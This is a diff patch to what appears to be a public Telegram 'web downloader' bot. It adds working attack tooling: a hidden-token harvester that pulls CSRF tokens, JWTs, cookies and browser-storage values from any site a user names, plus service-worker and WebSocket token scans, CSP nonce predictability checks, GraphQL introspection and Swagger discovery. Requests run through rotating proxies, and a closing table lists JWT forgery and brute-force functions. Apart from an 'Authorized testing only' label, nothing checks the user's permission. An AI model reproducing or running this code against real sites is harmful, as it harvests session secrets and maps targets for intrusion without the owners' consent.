+        "/sw-prod.js", "/sw-dev.js", "/ngsw.js",         # Angular SW
+        "/OneSignalSDKWorker.js", "/push-worker.js",
+    ]
+    findings = []
+    seen_sw  = set()
+
+    # Phase 2: discover SW via Link header + SW registration in HTML
+    try:
+        page_r = requests.get(url, timeout=8, verify=False,
+                              headers=_get_headers(), proxies=proxy_manager.get_proxy())
+        # Check Service-Worker-Allowed header on any existing SW path
+        scope_hint = page_r.headers.get("Service-Worker-Allowed", "")
+        if scope_hint:
+            findings.append({"type": "SW Scope", "name": "Service-Worker-Allowed",
+                             "value": scope_hint[:200], "source": "Response header"})
+        # Extract SW registration path from HTML
+        sw_reg_pat = re.compile(
+            r'serviceWorker\.register\([\'"]([^\'")]+\.js)[\'"]')
+        for m in sw_reg_pat.finditer(page_r.text[:100000]):
+            reg_path = m.group(1)
+            if not reg_path.startswith("http"):
+                reg_path = origin + ("" if reg_path.startswith("/") else "/") + reg_path
+            sw_paths.insert(0, reg_path.replace(origin, ""))
+    except Exception:
+        pass
+
+    for sw_path in list(dict.fromkeys(sw_paths)):  # deduplicate
+        try:
+            sw_url = origin + sw_path if sw_path.startswith("/") else sw_path
+            r = requests.get(
+                sw_url, timeout=6, verify=False,
+                headers=_get_headers(), proxies=proxy_manager.get_proxy()
+            )
+            if r.status_code != 200 or len(r.text) < 100:
+                continue
+            text = r.text
+
+            # Standard token/CSRF pattern scan
+            for key_type, pat in _CSRF_PATTERNS:
+                for m in pat.finditer(text):
+                    val = (m.group(1) if m.lastindex else m.group(0)).strip()
+                    dedup = key_type + ":" + val[:40]
+                    if dedup not in seen_sw and len(val) >= 8:
+                        seen_sw.add(dedup)
+                        findings.append({
+                            "type":   key_type,
+                            "name":   key_type,
+                            "value":  val[:200],
+                            "source": f"Service Worker {sw_path}",
+                        })
+
+            # Phase 2: Workbox __WB_MANIFEST precache list
+            if "__WB_MANIFEST" in text or "workbox" in text.lower():
+                # Extract precache URLs — may contain API endpoints or token-bearing paths
+                wb_urls = re.findall(
+                    r'[{,]\s*"url"\s*:\s*"([^"]+)"', text)
+                if wb_urls:
+                    dedup_wb = "wb_manifest:" + str(sorted(wb_urls))[:60]
+                    if dedup_wb not in seen_sw:
+                        seen_sw.add(dedup_wb)
+                        findings.append({
+                            "type":   "Workbox precache manifest",
+                            "name":   "WB_MANIFEST",
+                            "value":  f"{len(wb_urls)} cached paths: " + ", ".join(wb_urls[:5]),
+                            "source": f"Service Worker {sw_path}",
+                        })
+
+            # Phase 2: cache.addAll() URL list scan
+            cache_urls = re.findall(
+                r'cache(?:\.addAll\(|s\.open\()[^)]*[\'"]([^\'")]+)[\'"]')
+            for cu in cache_urls:
+                if any(kw in cu.lower() for kw in ["token","auth","api","key","secret"]):
+                    dedup = "sw_cache:" + cu[:60]
+                    if dedup not in seen_sw:
+                        seen_sw.add(dedup)
+                        findings.append({"type": "SW cache URL (suspicious)",
+                                         "name": "cache_url", "value": cu[:200],
+                                         "source": f"Service Worker {sw_path}"})
+        except Exception:
+            pass
+    return findings
+
+
+
+def _extract_csp_nonce(url: str) -> list:
+    """
+    Phase 3 Fix 5: CSP nonce entropy + predictability test.
+    - Fetch 4 samples instead of 2
+    - Shannon entropy calculation (< 3.5 bits/char = weak)
+    - Sequence pattern check (counter-based nonces)
+    - base64 decode attempt to estimate real entropy
+    """
+    import math, base64 as _b64n
+    findings = []
+    nonces_seen = []
+
+    def _shannon_entropy(s: str) -> float:
+        if not s:
+            return 0.0
+        freq = {}
+        for c in s:
+            freq[c] = freq.get(c, 0) + 1
+        n = len(s)
+        return -sum((cnt/n) * math.log2(cnt/n) for cnt in freq.values())
+
+    def _is_sequential(lst: list) -> bool:
+        """Detect counter-based nonces: if decoded ints differ by constant delta."""
+        ints = []
+        for val in lst:
+            try:
+                padded = val + "=" * (-len(val) % 4)
+                raw = _b64n.b64decode(padded)
+                ints.append(int.from_bytes(raw[-4:], "big"))
+            except Exception:
+                return False
+        if len(ints) < 3:
+            return False
+        deltas = [ints[i+1]-ints[i] for i in range(len(ints)-1)]
+        return len(set(deltas)) == 1  # all same delta → sequential
+
+    try:
+        for _ in range(4):
+            r = requests.get(url, timeout=8, verify=False,
+                             headers=_get_headers(), proxies=proxy_manager.get_proxy())
+            csp = r.headers.get("Content-Security-Policy", "")
+            for nonce in re.findall(r"'nonce-([A-Za-z0-9+/=]{8,200})'", csp):
+                nonces_seen.append(nonce)
+
+        if not nonces_seen:
+            return findings
+
+        rotates    = len(set(nonces_seen)) > 1
+        entropy    = _shannon_entropy(nonces_seen[0])
+        sequential = _is_sequential(list(set(nonces_seen))) if rotates else False
+
+        # Risk assessment
+        if not rotates:
+            risk = "HIGH — static nonce reused across all requests"
+        elif sequential:
+            risk = "HIGH — nonce appears sequential/counter-based (predictable)"
+        elif entropy < 3.5:
+            risk = f"MEDIUM — low entropy ({entropy:.2f} bits/char), may be guessable"
+        else:
+            risk = f"OK — rotating, entropy {entropy:.2f} bits/char"
+
+        findings.append({
+            "type":     "CSP Nonce",
+            "name":     "nonce",
+            "value":    nonces_seen[0],
+            "source":   "Content-Security-Policy header",
+            "rotates":  rotates,
+            "entropy":  round(entropy, 2),
+            "sequential": sequential,
+            "risk":     risk,
+            "note":     (
+                f"Rotation: {'yes' if rotates else 'NO — STATIC'}  |  "
+                f"Entropy: {entropy:.2f} bits/char  |  "
+                f"Sequential: {'YES — predictable' if sequential else 'no'}  |  "
+                f"Risk: {risk}"
+            ),
+        })
+    except Exception:
+        pass
+    return findings
+
+
+
+
+_SWAGGER_PATHS
+
+
+
+_SWAGGER_PATHS = [
+    "/swagger.json", "/swagger.yaml", "/openapi.json",
+    "/openapi.yaml", "/api-docs", "/api-docs/", "/v2/api-docs",
+    "/v3/api-docs", "/api/swagger.json", "/api/openapi.json",
+    "/redoc", "/docs", "/documentation",
+]
+
+
+_GRAPHQL_INTROSPECTION = """
+{
+  __schema {
+    types { name kind fields { name type { name kind } } }
+    queryType { name }
+    mutationType { name }
+    subscriptionType { name }
+  }
+}
+""".strip()
+
+
+
+def _fetch_swagger_spec(base_url: str) -> list:
+    """Try common Swagger/OpenAPI paths and return parsed endpoints."""
+    parsed = urlparse(base_url)
+    origin = f"{parsed.scheme}://{parsed.netloc}"
+    results = []
+    for path in _SWAGGER_PATHS:
+        try:
+            r = requests.get(
+                origin + path, timeout=6, verify=False,
+                headers=_get_headers(), proxies=proxy_manager.get_proxy()
+            )
+            if r.status_code == 200 and len(r.text) > 100:
+                ct = r.headers.get("Content-Type", "")
+                if "json" in ct or "yaml" in ct or path.endswith((".json", ".yaml")):
+                    try:
+                        spec = r.json()
+                        paths_obj = spec.get("paths", {})
+                        if paths_obj:
+                            results.append({
+                                "spec_url": origin + path,
+                                "endpoints": list(paths_obj.keys())[:50],
+                                "title": spec.get("info", {}).get("title", "Unknown"),
+                                "version": spec.get("info", {}).get("version", ""),
+                            })
+                    except Exception:
+                        results.append({
+                            "spec_url": origin + path,
+                            "endpoints": [],
+                            "raw_preview": r.text[:300],
+                        })
+        except Exception:
+            pass
+    return results
+
+
+
+def _probe_graphql(base_url: str) -> dict:
+    """Run GraphQL introspection on common endpoints."""
+    parsed   = urlparse(base_url)
+    origin   = f"{parsed.scheme}://{parsed.netloc}"
+    gql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql"]
+    for gql_path in gql_paths:
+        try:
+            r = requests.post(
+                origin + gql_path,
+                json={"query": _GRAPHQL_INTROSPECTION},
+                timeout=8, verify=False,
+                headers={**_get_headers(), "Content-Type": "application/json"},
+                proxies=proxy_manager.get_proxy()
+            )
+            if r.status_code == 200:
+                data = r.json()
+                schema = data.get("data", {}).get("__schema", {})
+                if schema:
+                    types = [t["name"] for t in schema.get("types", [])
+                             if not t["name"].startswith("__")]
+                    return {
+                        "vulnerable": True,
+                        "endpoint":   origin + gql_path,
+                        "types":      types[:30],
+                        "query_type": (schema.get("queryType") or {}).get("name"),
+                        "mutation_type": (schema.get("mutationType") or {}).get("name"),
+                    }
+        except Exception:
+            pass
+    return {"vulnerable": False}
+
+
+
+def _fetch_next_routes(base_url: str) -> list:
+    """Parse Next.js _buildManifest.js for client-side routes."""
+    parsed = urlparse(base_url)
+    origin = f"{parsed.scheme}://{parsed.netloc}"
+    routes = []
+    try:
+        # Find the manifest URL from HTML
+        r = requests.get(
+            base_url, timeout=8, verify=False,
+            headers=_get_headers(), proxies=proxy_manager.get_proxy()
+        )
+        manifest_urls = re.findall(
+            r'/_next/static/[^"\']+/_buildManifest\.js', r.text
+        )
+        for mu in manifest_urls[:2]:
+            try:
+                mr = requests.get(
+                    origin + mu, timeout=6, verify=False,
+                    headers=_get_headers(), proxies=proxy_manager.get_proxy()
+                )
+                found = re.findall(r'"(/[^"]+)"', mr.text)
+                routes.extend([f for f in found if f.startswith("/") and len(f) > 1])
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return list(dict.fromkeys(routes))[:60]
+
+
+
+_OAUTH_TOKEN_ENDPOINTS = [
+    "/oauth/token", "/auth/token", "/token", "/oauth2/token",
+    "/connect/token", "/api/auth/token", "/realms/master/protocol/openid-connect/token",
+]
+
+# Append these new patterns to existing _OAUTH_PATTERNS list
+
+_OAUTH_PATTERNS_EXTRA = [
+    ("OAuth state param",
+     re.compile(r'(?i)[?&]state=([A-Za-z0-9_\-\.]{8,100})')),
+    ("PKCE code_challenge",
+     re.compile(r'(?i)code_challenge(?:_method)?\s*[=:]\s*["\']?([A-Za-z0-9+/=._-]{10,200})["\']?')),
+    ("Implicit access_token (fragment)",
+     re.compile(r'(?i)[#&]access_token=([A-Za-z0-9_\-\.]{20,500})')),
+    ("OAuth scope",
+     re.compile(r'(?i)[?&]scope=([A-Za-z0-9_%+\s:./]{5,200})')),
+    ("OIDC nonce",
+     re.compile(r'(?i)[?&]nonce=([A-Za-z0-9_\-\.]{8,100})')),
+]
+
+
+_CSRF_PATTERNS = [
+    # Original patterns
+    ("CSRF Token",               re.compile(r'(?i)(?:csrf|xsrf|_token|verification.token)\s*[=:]\s*["\']([A-Za-z0-9_\-+=/]{20,200})["\']')),
+    ("Nonce",                    re.compile(r'(?i)(?:nonce|__nonce__)\s*[=:]\s*["\']([A-Za-z0-9+/=]{20,100})["\']')),
+    ("Laravel CSRF Token",       re.compile(r'(?i)(?:_token|laravel.token)\s*[=:]\s*["\']([A-Za-z0-9+/=]{40,80})["\']')),
+    ("Django CSRF",              re.compile(r'(?i)csrfmiddlewaretoken\s*[=:]\s*["\']([A-Za-z0-9]{40,80})["\']')),
+    ("Rails Authenticity Token", re.compile(r'(?i)authenticity.token\s*[=:]\s*["\']([A-Za-z0-9+/=]{40,100})["\']')),
+    ("WordPress Nonce",          re.compile(r'(?i)wp.{0,5}nonce\s*[=:]\s*["\']([A-Za-z0-9]{10})["\']')),
+    ("JWT Bearer Token",         re.compile(r'(?i)(?:bearer|authorization)\s*[=:]\s*["\']?(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)')),
+    # 15 NEW patterns
+    ("Meta CSRF Token",          re.compile(r'<meta[^>]+name=["\'](?:csrf-token|_csrf|xsrf-token)["\'][^>]+content=["\']([A-Za-z0-9_\-+=/]{16,200})["\']', re.I)),
+    ("Meta CSRF (reversed)",     re.compile(r'<meta[^>]+content=["\']([A-Za-z0-9_\-+=/]{16,200})["\'][^>]+name=["\'](?:csrf-token|_csrf|xsrf-token)["\']', re.I)),
+    ("Angular XSRF Cookie",      re.compile(r'(?i)XSRF-TOKEN\s*[=:]\s*["\']?([A-Za-z0-9_\-+=/]{20,200})["\']?')),
+    ("Spring CSRF",              re.compile(r'(?i)_csrf(?:Token|Header|ParameterName)?\s*[=:]\s*["\']([A-Za-z0-9_\-+=/]{16,200})["\']')),
+    ("Symfony CSRF",             re.compile(r'(?i)_token\s*[=:]\s*["\']([A-Za-z0-9_\-]{40,100})["\']')),
+    ("ASP.NET ViewState",        re.compile(r'__VIEWSTATE["\s]*value=["\']([A-Za-z0-9+/=]{20,5000})["\']')),
+    ("ASP.NET RequestToken",     re.compile(r'__RequestVerificationToken[^>]*value=["\']([A-Za-z0-9+/=_\-]{20,500})["\']')),
+    ("Flask WTF CSRF",           re.compile(r'(?i)csrf_token\s*[=:]\s*["\']([A-Za-z0-9_\-+=/]{20,200})["\']')),
+    ("Drupal Form Token",        re.compile(r'(?i)form_build_id\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,200})["\']')),
+    ("Drupal CSRF Token",        re.compile(r'(?i)(?:X-CSRF-Token|drupal.settings.csrf)\s*[=:]\s*["\']([A-Za-z0-9_\-+=/]{20,200})["\']')),
+    ("Next.js CSRF",             re.compile(r'(?i)__Host-next-auth\.csrf-token\s*[=:]\s*["\']?([A-Za-z0-9_\-+=/|]{30,300})["\']?')),
+    # Phase 2 Fix 5: CSRF vs OAuth state distinguish
+    # Only flag state= as CSRF if near csrf/auth/nonce context — not bare state= (form field)
+    ("OAuth CSRF state param",   re.compile(
+        r'(?:oauth|authorize|auth|redirect_uri|client_id).{0,200}[?&]state=([A-Za-z0-9_\-\.]{16,100})'
+        r'|[?&]state=([A-Za-z0-9_\-\.]{16,100}).{0,200}(?:oauth|redirect_uri|client_id)', re.I
+    )),
+    ("API Signature Nonce",      re.compile(r'(?i)(?:api.nonce|request.nonce|x-nonce)\s*[=:]\s*["\']?([A-Za-z0-9_\-]{8,64})["\']?')),
+    ("Recaptcha Token",          re.compile(r'(?i)g-recaptcha-response["\s]*value=["\']([A-Za-z0-9_\-]{20,2048})["\']')),
+]
+
+# New JS eval string — add IndexedDB scan
 def _hiddenkeys_sync(url: str, progress_cb=None) -> dict:
-    data = _extract_run(url, _HIDDEN_JS_EVAL, progress_cb)
+    """Improved hidden key extractor — meta, CSP nonce, sw.js, IndexedDB, 22 patterns."""
+    data = _extract_run(url, _HIDDEN_JS_EVAL_IMPROVED, progress_cb)
     if data.get("error"):
         return {"error": data["error"], "findings": [], "page_url": url}
-    findings = []; seen = set()
+
+    findings = []
+    seen     = set()
+
     def _add(t, name, value, src):
-        d = t+":"+name
+        # dedup key: [:80] — [:30] was too narrow, UUID prefix collisions ဖြစ်တတ်
+        d = t + ":" + name + ":" + value[:80]
         if d not in seen and len(value) >= 5:
             seen.add(d)
             findings.append({"type": t, "name": name, "value": value[:200], "source": src})
-    if progress_cb: progress_cb("🔍 Extracting hidden tokens, CSRF, localStorage...")
-    # From DOM eval
+
+    if progress_cb:
+        progress_cb("🔍 Extracting CSRF tokens, meta tags, CSP nonce, localStorage...")
+
+    # DOM eval results
     dr = data.get("dom_result") or {}
     for tok in dr.get("tokens", []):
-        n, v, tag = tok.get("name",""), tok.get("value",""), tok.get("tag","")
+        n, v, tag = tok.get("name", ""), tok.get("value", ""), tok.get("tag", "")
         if v:
-            t = "CSRF Token" if any(x in n.lower() for x in ["csrf","xsrf","token","nonce","verify"]) else "Hidden Input"
-            _add(t, n, v, f"DOM {tag}")
+            ktype = "CSRF Token" if any(
+                x in n.lower() for x in ["csrf", "xsrf", "token", "nonce", "verify"]
+            ) else ("Meta Token" if tag == "META" else "Hidden Input")
+            _add(ktype, n, v, f"DOM {tag}")
+
     for k, v in dr.get("localStorage", {}).items():
-        ttype = "JWT (localStorage)" if v.startswith("eyJ") else "localStorage value"
-        _add(ttype, k, v, "localStorage")
+        ktype = "JWT (localStorage)" if v.startswith("eyJ") else "localStorage value"
+        _add(ktype, k, v, "localStorage")
+
     for k, v in dr.get("sessionStorage", {}).items():
-        ttype = "JWT (sessionStorage)" if v.startswith("eyJ") else "sessionStorage value"
-        _add(ttype, k, v, "sessionStorage")
+        ktype = "JWT (sessionStorage)" if v.startswith("eyJ") else "sessionStorage value"
+        _add(ktype, k, v, "sessionStorage")
+
     for c in dr.get("cookies", []):
-        n, v = c.get("name",""), c.get("value","")
-        ttype = "JWT (cookie)" if v.startswith("eyJ") else "Cookie"
-        _add(ttype, n, v, "Cookie (JS-readable)")
-    # From HTML/JS text
+        n, v = c.get("name", ""), c.get("value", "")
+        ktype = "JWT (cookie)" if v.startswith("eyJ") else "Cookie"
+        _add(ktype, n, v, "Cookie (JS-readable)")
+
+    for idb_name in dr.get("indexedDBKeys", []):
+        if str(idb_name).startswith("__idb_error__"):
+            # IDB scan failed — log warning, skip as finding
+            logger.warning("IndexedDB scan failed: %s", idb_name)
+            continue
+        _add("IndexedDB database", idb_name, idb_name, "IndexedDB")
+
+    # ShadowDOM tokens (pierce scan from Playwright)
+    for stok in dr.get("__shadow_tokens__", []):
+        n = stok.get("name", "shadow-hidden")
+        v = stok.get("value", "")
+        if v:
+            ktype = "CSRF Token (Shadow)" if any(
+                x in n.lower() for x in ["csrf", "xsrf", "token", "nonce", "verify"]
+            ) else "Hidden Input (Shadow)"
+            _add(ktype, n, v, "ShadowDOM pierce")
+
+    # Pattern scan on all text
     for text, label in _gather_all_text(data):
         for key_type, pat in _CSRF_PATTERNS:
             for m in pat.finditer(text):
                 val = m.group(1) if m.lastindex else m.group(0)
                 _add(key_type, key_type, val.strip(), label)
-    return {"error": None, "findings": findings, "page_url": data["page_url"],
-            "requests": len(data.get("network_log", []))}
+
+    # CSP header nonce
+    if progress_cb:
+        progress_cb("🔍 Checking CSP header for nonce...")
+    csp_findings = _extract_csp_nonce(url)
+    for f in csp_findings:
+        _add(f["type"], f["name"], f["value"], f["source"])
+
+    # Service worker scan
+    if progress_cb:
+        progress_cb("🔍 Scanning service workers (sw.js)...")
+    sw_findings = _scan_service_worker(url)
+    for f in sw_findings:
+        _add(f["type"], f["name"], f["value"], f["source"])
+
+    # Phase 3 Fix 6: GraphQL persisted query token extraction
+    if progress_cb:
+        progress_cb("🔮 Scanning GraphQL persisted queries for tokens...")
+    _gql_pat = re.compile(r'["\'](query|mutation)["\'\s]*[:{]', re.I)
+    _gql_val_pat = re.compile(r'"(variables|extensions)"\s*:\s*\{([^}]{10,500})\}')
+    for text, label in _gather_all_text(data):
+        # Scan GQL variables/extensions blocks for embedded tokens
+        for gm in _gql_val_pat.finditer(text):
+            qval = gm.group(2).strip()
+            for key_type, pat in _CSRF_PATTERNS:
+                for km in pat.finditer(qval):
+                    val = (km.group(1) if km.lastindex else km.group(0)).strip()
+                    _add(key_type + " (GraphQL)", key_type, val, f"GQL vars in {label[:50]}")
+            for key_type, pat in _API_KEY_PATTERNS:
+                for km in pat.finditer(qval):
+                    val = (km.group(1) if km.lastindex else km.group(0)).strip()
+                    _add(key_type + " (GraphQL)", val, f"GQL vars in {label[:50]}")
+
+    # Phase 3 Fix 7: WebSocket frame token scan
+    for wsf in data.get("ws_frames", []):
+        payload = wsf.get("payload", "")
+        if not payload:
+            continue
+        ws_src = f"WebSocket {wsf.get('dir','')} {wsf.get('url','')[:60]}"
+        for key_type, pat in _CSRF_PATTERNS:
+            for m in pat.finditer(payload):
+                val = (m.group(1) if m.lastindex else m.group(0)).strip()
+                _add(key_type + " (WebSocket)", key_type, val, ws_src)
+        # JWT in WS payload
+        for jm in re.finditer(r'(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)', payload):
+            _add("JWT (WebSocket)", "jwt", jm.group(1), ws_src)
+
+    # Phase 2 Fix 6: sort findings by severity (CRITICAL first)
+    _HIDDEN_SEV = {
+        "CSRF Token (Shadow)": 0, "JWT": 1,
+        "CSRF Token": 2, "CSP Nonce": 3, "IndexedDB database": 4,
+        "Workbox": 5, "SW cache": 5, "SW Scope": 6,
+    }
+    def _hidden_sev_key(f):
+        t = f.get("type", "")
+        for k, v in _HIDDEN_SEV.items():
+            if k in t:
+                return v
+        return 9
+    findings.sort(key=_hidden_sev_key)
+
+    return {
+        "error":    None,
+        "findings": findings,
+        "page_url": data["page_url"],
+        "requests": len(data.get("network_log", [])),
+        "csp_nonces":      [f for f in findings if "CSP Nonce" in f["type"]],
+        "sw_findings":     sw_findings,
+        "indexeddb_names": [k for k in dr.get("indexedDBKeys", []) if not str(k).startswith("__idb_error__")],
+        "shadow_count":    len([f for f in findings if "Shadow" in f.get("type","")]),
+        "env_injections":  len([f for f in findings if "env" in f.get("type","").lower()]),
+    }
 
 
-async def cmd_hiddenkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/hiddenkeys <url> — Extract CSRF tokens, hidden inputs, localStorage, cookies"""
-    if not await check_force_join(update, context): return
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/hiddenkeys https://example.com`\n\n"
-            "🔐 *Extracts:*\n"
-            "  • CSRF / XSRF tokens\n"
-            "  • Hidden form inputs\n"
-            "  • WordPress nonces\n"
-            "  • Django / Laravel / Rails tokens\n"
-            "  • JWT tokens from localStorage / sessionStorage\n"
-            "  • JavaScript-readable cookies\n\n"
-            "⚠️ _Authorized testing only_", parse_mode='Markdown')
-        return
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-    url = context.args[0].strip()
-    if not url.startswith("http"): url = "https://" + url
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-    domain = urlparse(url).netloc
-    msg = await update.effective_message.reply_text(
-        f"🔐 *Hidden Token Extractor — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
-    progress_q = []
-    async def _prog():
-        while True:
-            await asyncio.sleep(2)
-            if progress_q:
-                t = progress_q[-1]; progress_q.clear()
-                try: await msg.edit_text(f"🔐 *Hidden Keys — `{domain}`*\n\n{t}", parse_mode='Markdown')
-                except: pass
-    prog = asyncio.create_task(_prog())
-    try:
-        result = await asyncio.to_thread(_hiddenkeys_sync, url, lambda t: progress_q.append(t))
-    except Exception as e:
-        prog.cancel(); await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown'); return
-    finally:
-        prog.cancel()
-    if result.get("error"):
-        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown'); return
-    findings = result["findings"]; page_url = result["page_url"]
-    if not findings:
-        await msg.edit_text(
-            f"🔐 *Hidden Token Extractor — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"📭 No hidden tokens found\n🌐 `{page_url}`", parse_mode='Markdown')
-        return
-    lines = [f"🔐 *Hidden Tokens — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
-             f"🌐 `{page_url}`", f"✅ Found: `{len(findings)}`\n"]
-    for i, f in enumerate(findings, 1):
-        lines.append(f"*[{i}] {f['type']}*")
-        lines.append(f"  Name:  `{f['name']}`")
-        lines.append(f"  Value: `{f['value'][:80]}`")
-        lines.append(f"  _📂 {f['source'][:60]}_\n")
-    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
-    report = "\n".join(lines)
-    try:
-        if len(report) <= 4000: await msg.edit_text(report, parse_mode='Markdown')
-        else: await msg.edit_text(report[:4000], parse_mode='Markdown')
-    except BadRequest:
-        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
-    import io as _io
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe_d = re.sub(r'[^\w\-]', '_', domain)
-    try:
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=_io.BytesIO(json.dumps({"domain": domain, "page_url": page_url,
-                "scanned_at": datetime.now().isoformat(), "findings": findings},
-                indent=2, ensure_ascii=False).encode()),
-            filename=f"hiddenkeys_{safe_d}_{ts}.json",
-            caption=f"🔐 Hidden Keys — `{domain}` — `{len(findings)}` found",
-            parse_mode='Markdown')
-    except Exception as e:
-        logger.warning("hiddenkeys export error: %s", e)
-
-
-# ══════════════════════════════════════════════════
-# 🌐  7. /endpoints — API Endpoint Discoverer
-# ══════════════════════════════════════════════════
-
+# ═══════════════════════════════════════════════════════════════════
+# END OF PATCH
+# Summary of paste locations in web_downloader_bot_v17_fixed.py:
+#
+#  Function                  | Original line | Replace with
+#  ──────────────────────────┼───────────────┼──────────────────────
+#  _vuln_scan_sync           | ~2060         | [1] above
+#  _format_vuln_report       | ~2145         | [1] above
+#  _jwt_none_attack          | ~5500         | [2] above
+#  _jwt_kid_injection        | NEW           | [2] above (add new)
+#  _jwt_exp_forgery          | NEW           | [2] above (add new)
+#  _jwt_jwks_spoof           | NEW           | [2] above (add new)
+#  _jwt_alg_confusion        | ~5524         | [2] above
+#  _jwt_brute_force          | ~5550         | [2] above
+#  _fuzz_sync                | ~4252         | [3] above
+#  _smartfuzz_probe_sync     | ~5231         | [3] above
+#  _endpoints_sync           | ~8865         | [4] above
+#  _oauthscan_sync           | ~17863        | [5] above
+#  _CSRF_PATTERNS            | ~8696         | [6] above (replace)
+#  _HIDDEN_JS_EVAL           | ~8654         | use _HIDDEN_JS_EVAL_IMPROVED
+#  _hiddenkeys_sync          | ~8706         | [6] above
+# ═══════════════════════════════════════════════════════════════════
 _ENDPOINT_PATTERNS = [
     ("REST API",    re.compile(r'(?i)["\']/(api/v?\d?/?[a-zA-Z0-9_/\-]{3,80})["\']')),
     ("GraphQL",     re.compile(r'(?i)["\']?((?:https?://[^"\']+)?/graphql(?:/v\d)?)["\']?')),
@@ -8863,122 +9342,105 @@ _ENDPOINT_JS_EVAL = """() => {
 }"""
 
 def _endpoints_sync(url: str, progress_cb=None) -> dict:
+    """Improved endpoint discovery — Swagger + GraphQL + Next.js routes + gRPC."""
     data = _extract_run(url, _ENDPOINT_JS_EVAL, progress_cb)
     if data.get("error"):
         return {"error": data["error"], "findings": [], "page_url": url}
-    findings = []; seen = set()
+
+    findings = []
+    seen     = set()
+
     def _add(t, v, src):
-        d = t+":"+v
+        d = t + ":" + v
         if d not in seen and len(v) >= 8:
-            seen.add(d); findings.append({"type": t, "endpoint": v, "source": src})
-    if progress_cb: progress_cb("🔍 Mapping API endpoints, WebSockets, GraphQL...")
+            seen.add(d)
+            findings.append({"type": t, "endpoint": v, "source": src})
+
+    if progress_cb:
+        progress_cb("🔍 Scanning endpoints, fetching Swagger/OpenAPI specs...")
+
+    # ── Pattern scan on HTML + JS corpus ─────────
     for text, label in _gather_all_text(data):
         for key_type, pat in _ENDPOINT_PATTERNS:
             for m in pat.finditer(text):
                 val = m.group(1) if m.lastindex else m.group(0)
-                _add(key_type, val.strip().rstrip("'\""), label)
-    # From network log — capture actual API calls made by browser
+                _add(key_type, val.strip().rstrip("\"'"), label)
+
+    # ── Network log from Playwright ───────────────
     for entry in data.get("network_log", []):
         u = entry.get("url", "")
         if any(x in u for x in ["/api/", "/graphql", "/v1/", "/v2/", "/v3/"]):
             _add("Actual API call", u[:150], "Network request")
         if u.startswith("wss://") or u.startswith("ws://"):
             _add("WebSocket (live)", u[:150], "Network request")
-    # DOM eval
+        # gRPC-web detection
+        ct = entry.get("content_type", "")
+        if "grpc" in ct.lower() or "application/grpc" in ct.lower():
+            _add("gRPC-web endpoint", u[:150], "Network (grpc content-type)")
+
+    # ── DOM eval env URLs ─────────────────────────
     dr = data.get("dom_result") or {}
     for k, v in dr.items():
         if isinstance(v, list):
             for item in v:
                 if isinstance(item, str) and item.startswith("http"):
                     _add("Env URL", item[:150], f"window env {k}")
-    return {"error": None, "findings": findings, "page_url": data["page_url"],
-            "requests": len(data.get("network_log", []))}
+
+    # ── Swagger / OpenAPI spec fetch ──────────────
+    if progress_cb:
+        progress_cb("📄 Fetching Swagger/OpenAPI specs...")
+    swagger_specs = _fetch_swagger_spec(url)
+    for spec in swagger_specs:
+        _add("OpenAPI spec", spec["spec_url"], "Swagger discovery")
+        for ep in spec.get("endpoints", [])[:20]:
+            _add("OpenAPI endpoint", ep, f"Spec: {spec['spec_url']}")
+
+    # ── GraphQL introspection ─────────────────────
+    if progress_cb:
+        progress_cb("🔮 Probing GraphQL introspection...")
+    gql = _probe_graphql(url)
+    if gql["vulnerable"]:
+        _add("GraphQL endpoint", gql["endpoint"], "Introspection")
+        for t in gql.get("types", []):
+            _add("GraphQL type", t, gql["endpoint"])
+
+    # ── Next.js route manifest ────────────────────
+    if progress_cb:
+        progress_cb("📦 Checking Next.js build manifest...")
+    next_routes = _fetch_next_routes(url)
+    for route in next_routes:
+        _add("Next.js route", route, "_buildManifest.js")
+
+    # Group versioned endpoints
+    versioned = {}
+    for f in findings:
+        ep = f["endpoint"]
+        m  = re.search(r"/(v\d+)/", ep)
+        if m:
+            ver = m.group(1)
+            versioned.setdefault(ver, []).append(ep)
+
+    return {
+        "error":       None,
+        "findings":    findings,
+        "page_url":    data["page_url"],
+        "requests":    len(data.get("network_log", [])),
+        "swagger":     swagger_specs,
+        "graphql":     gql,
+        "next_routes": next_routes,
+        "versioned":   versioned,
+    }
 
 
-async def cmd_endpoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/endpoints <url> — Discover API endpoints, GraphQL, WebSocket, REST base URLs"""
-    if not await check_force_join(update, context): return
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/endpoints https://example.com`\n\n"
-            "🌐 *Discovers:*\n"
-            "  • REST API paths (/api/v1/...)\n"
-            "  • GraphQL endpoints\n"
-            "  • WebSocket URLs (wss://)\n"
-            "  • Supabase, Hasura, Prismic, Sanity\n"
-            "  • S3 buckets, CDN URLs\n"
-            "  • Actual API calls made by browser\n\n"
-            "⚠️ _Authorized testing only_", parse_mode='Markdown')
-        return
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-    url = context.args[0].strip()
-    if not url.startswith("http"): url = "https://" + url
